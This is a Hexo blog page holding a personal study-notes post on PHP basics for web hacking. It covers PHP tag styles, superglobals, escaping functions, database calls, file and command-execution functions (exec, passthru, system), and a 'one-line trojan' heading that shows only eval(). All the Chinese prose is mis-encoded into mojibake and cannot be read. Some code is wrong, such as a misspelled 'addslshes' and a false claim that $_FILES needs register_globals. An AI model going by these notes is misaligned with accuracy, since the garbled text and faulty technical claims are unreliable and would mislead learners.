<h1 id="ç¬¬ä¹ç« -PHPåŸºç¡€"><a href="#ç¬¬ä¹ç« -PHPåŸºç¡€" class="headerlink" title="ç¬¬ä¹ç«  PHPåŸºç¡€"></a>ç¬¬ä¹ç«  PHPåŸºç¡€</h1><h2 id="å¿«é€Ÿå…¥é—¨"><a href="#å¿«é€Ÿå…¥é—¨" class="headerlink" title="å¿«é€Ÿå…¥é—¨"></a>å¿«é€Ÿå…¥é—¨</h2><p>ä¸€ä¸ªPHPæ–‡ä»¶ç”±äº”ä¸ªéƒ¨åˆ†ç»„æˆï¼šHTMLã€PHPæ ‡è®°ã€PHPè¯­å¥ã€ç©ºæ ¼ã€æ³¨é‡Š</p>
<h3 id="PHPæ ‡è®°é£æ ¼"><a href="#PHPæ ‡è®°é£æ ¼" class="headerlink" title="PHPæ ‡è®°é£æ ¼"></a>PHPæ ‡è®°é£æ ¼</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo &#39;å†…å®¹&#39;; ?&gt;</span><br><span class="line">#XMLé£æ ¼</span><br><span class="line">&lt;? echo &#39;å†…å®¹&#39;; ?&gt; </span><br><span class="line">#ç®€çŸ­é£æ ¼ï¼Œéœ€è¦åœ¨php.iniä¸­å¯ç”¨short_open_tagï¼Œä¸”æ˜¯é»˜è®¤å¯ç”¨</span><br><span class="line">&lt;SCRIPT LANGUAGE&#x3D;&#39;php&#39;&gt;echo &#39;å†…å®¹&#39;;&lt;&#x2F;SCRIPT&gt; </span><br><span class="line">#SCRIPTé£æ ¼</span><br><span class="line">&lt;% echo &#39;å†…å®¹&#39; %&gt; </span><br><span class="line"># ASPé£æ ¼ï¼Œéœ€è¦å¯ç”¨asp_tagsï¼Œé»˜è®¤ä¸å¯ç”¨</span><br></pre></td></tr></table></figure>
<h3 id="è®¿é—®è¡¨å•å˜é‡"><a href="#è®¿é—®è¡¨å•å˜é‡" class="headerlink" title="è®¿é—®è¡¨å•å˜é‡"></a>è®¿é—®è¡¨å•å˜é‡</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$display # éœ€è¦å¼€å¯register_globalsï¼Œé»˜è®¤ä¸å¼€å¯</span><br><span class="line">$_POST[&#39;display&#39;] # é»˜è®¤</span><br><span class="line">$HTTP_POST_VARS[&#39;display&#39;] # å¼ƒç”¨ </span><br></pre></td></tr></table></figure>
<h3 id="å…¨å±€å˜é‡"><a href="#å…¨å±€å˜é‡" class="headerlink" title="å…¨å±€å˜é‡"></a>å…¨å±€å˜é‡</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$GLOBALSã€$_SERVERã€$_GETã€$_POSTã€$_COOKIEã€$_FILESã€$_ENVã€$_REQUESTã€$_SESSION</span><br></pre></td></tr></table></figure>
<h2 id="å­—ç¬¦ä¸²æ“ä½œ"><a href="#å­—ç¬¦ä¸²æ“ä½œ" class="headerlink" title="å­—ç¬¦ä¸²æ“ä½œ"></a>å­—ç¬¦ä¸²æ“ä½œ</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">trim() # å»é™¤ç©ºæ ¼</span><br><span class="line">addslshes() # è½¬ç§»å­—ç¬¦</span><br><span class="line">stripslashes() # ä¸addslshesåŠŸèƒ½ç›¸å</span><br><span class="line">php.iniä¸­çš„magic_quotes_gpcé…ç½®æŒ‡ä»¤ # è‹¥ä¸ºTRUEï¼Œåˆ™ä¼šå®ç°addslsheså’Œstripslashes</span><br></pre></td></tr></table></figure>
<h2 id="æ•°æ®åº“æ“ä½œ"><a href="#æ•°æ®åº“æ“ä½œ" class="headerlink" title="æ•°æ®åº“æ“ä½œ"></a>æ•°æ®åº“æ“ä½œ</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$db &#x3D; new mysqli(&#39;ä¸»æœºå&#39;ï¼Œ&#39;MYSQLç”¨æˆ·å&#39;, &#39;MYSQLå¯†ç &#39;,&#39;éœ€è¦è®¿é—®çš„æ•°æ®åº“&#39;)</span><br><span class="line">$db &#x3D; mysqli_connect(&#39;ä¸»æœºå&#39;ï¼Œ&#39;MYSQLç”¨æˆ·å&#39;, &#39;MYSQLå¯†ç &#39;,&#39;éœ€è¦è®¿é—®çš„æ•°æ®åº“&#39;)</span><br><span class="line"></span><br><span class="line">$result &#x3D; mysql_query(&quot;select * from hack&quot;)</span><br><span class="line">$result &#x3D; mysql_db_query(&quot;crack&quot;,&quot;select * from hack&quot;)</span><br></pre></td></tr></table></figure>
<h2 id="é«˜çº§åŠŸèƒ½"><a href="#é«˜çº§åŠŸèƒ½" class="headerlink" title="é«˜çº§åŠŸèƒ½"></a>é«˜çº§åŠŸèƒ½</h2><h3 id="ä¸æ–‡ä»¶ç³»ç»Ÿå’ŒæœåŠ¡å™¨äº¤äº’"><a href="#ä¸æ–‡ä»¶ç³»ç»Ÿå’ŒæœåŠ¡å™¨äº¤äº’" class="headerlink" title="ä¸æ–‡ä»¶ç³»ç»Ÿå’ŒæœåŠ¡å™¨äº¤äº’"></a>ä¸æ–‡ä»¶ç³»ç»Ÿå’ŒæœåŠ¡å™¨äº¤äº’</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#ä¸Šä¼ </span><br><span class="line">åœ¨è¶…çº§å…¨å±€æ•°ç»„$_FILESä¸­å¤„ç†ï¼ˆéœ€è¦register_globalå¼€å¯ï¼‰</span><br><span class="line"></span><br><span class="line">#ç›®å½•æ–‡ä»¶</span><br><span class="line">opendir()</span><br><span class="line">readdir()</span><br><span class="line">closedir()</span><br><span class="line">mkdir()</span><br><span class="line">basename(),dirname()</span><br><span class="line">rmdir()</span><br><span class="line">copy()</span><br><span class="line">rename()</span><br><span class="line"></span><br><span class="line">#ç¨‹åºæ‰§è¡Œå‡½æ•°</span><br><span class="line">exec(string command[,array &amp;result[,int &amp;result_value]]) # åªè¿”å›å‘½ä»¤ç»“æœçš„æœ€åä¸€è¡Œï¼Œè‹¥ä»¥resultä¼ é€’å˜é‡ï¼Œå°†è·å¾—è¿”å›å­—ç¬¦ä¸²æ•°ç»„ï¼›è‹¥result_valueä¼ é€’å˜é‡ï¼Œå°†è·å¾—è¿”å›ä»£ç </span><br><span class="line">passthru() #å°†ç»“æœç›´æ¥è¾“å‡ºå¹¶æ˜¾ç¤ºåœ¨æµè§ˆå™¨</span><br><span class="line">system() #å°†ç»“æœç›´æ¥è¾“å‡ºå¹¶æ˜¾ç¤ºåœ¨æµè§ˆå™¨</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="ä¼šè¯æ§åˆ¶"><a href="#ä¼šè¯æ§åˆ¶" class="headerlink" title="ä¼šè¯æ§åˆ¶"></a>ä¼šè¯æ§åˆ¶</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setcookie()</span><br><span class="line">session_get_cookie_params()</span><br></pre></td></tr></table></figure>
<h3 id="ä¸€å¥è¯æœ¨é©¬"><a href="#ä¸€å¥è¯æœ¨é©¬" class="headerlink" title="ä¸€å¥è¯æœ¨é©¬"></a>ä¸€å¥è¯æœ¨é©¬</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval()</span><br></pre></td></tr></table></figure>
<h1 id="ç¬¬åç« -PHPç¨‹åºå¸¸è§é—®é¢˜"><a href="#ç¬¬åç« -PHPç¨‹åºå¸¸è§é—®é¢˜" class="headerlink" title="ç¬¬åç«  PHPç¨‹åºå¸¸è§é—®é¢˜"></a>ç¬¬åç«  PHPç¨‹åºå¸¸è§é—®é¢˜</h1><h2 id="PHPæ³¨å°„æ¼æ´"><a href="#PHPæ³¨å°„æ¼æ´" class="headerlink" title="PHPæ³¨å°„æ¼æ´"></a>PHPæ³¨å°„æ¼æ´</h2><p>intval() å°†æ‰€æœ‰æ•°æ®å¼ºåˆ¶è½¬æ¢ä¸ºæ•°å­—</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/12/23/%E7%B2%BE%E9%80%9A%E9%BB%91%E5%AE%A2%E8%84%9A%E6%9C%AC%E7%AC%94%E8%AE%B0/" data-id="ckk1u3o4l0003tsus645bcfkw" data-title="ç²¾é€šé»‘å®¢è„šæœ¬ç¬”è®°" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-hello-my-blog" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/12/22/hello-my-blog/" class="article-date">
  <time class="dt-published" datetime="2020-12-22T08:02:53.000Z" itemprop="datePublished">2020-12-22</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/12/22/hello-my-blog/">hello my blog</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/12/22/hello-my-blog/" data-id="ckk1u3o4h0001tsus1mci359t" data-title="hello my blog" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dev/" rel="tag">dev</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E5%AD%A6/" rel="tag">æ–‡å­¦</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%80%83%E8%AF%81/" rel="tag">è€ƒè¯</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/dev/" style="font-size: 15px;">dev</a> <a href="/tags/%E6%96%87%E5%AD%A6/" style="font-size: 10px;">æ–‡å­¦</a> <a href="/tags/%E8%80%83%E8%AF%81/" style="font-size: 10px;">è€ƒè¯</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/03/04/CTF-wp-Hack101/">CTF-wp-Hack101</a>
          </li>
        
          <li>
            <a href="/2021/03/04/DEV-python-flask/">DEV-python-flask</a>
          </li>
        
          <li>
            <a href="/2021/03/02/DEV-python-tornado/">DEV-python-tornado</a>
          </li>
        
          <li>
            <a href="/2021/03/01/DEV-perl/">dev-perl</a>
          </li>
        
          <li>
            <a href="/2021/02/28/CTF-wp-BUUCTF-Web/">CTF-wp-BUUCTF Web</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2021 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>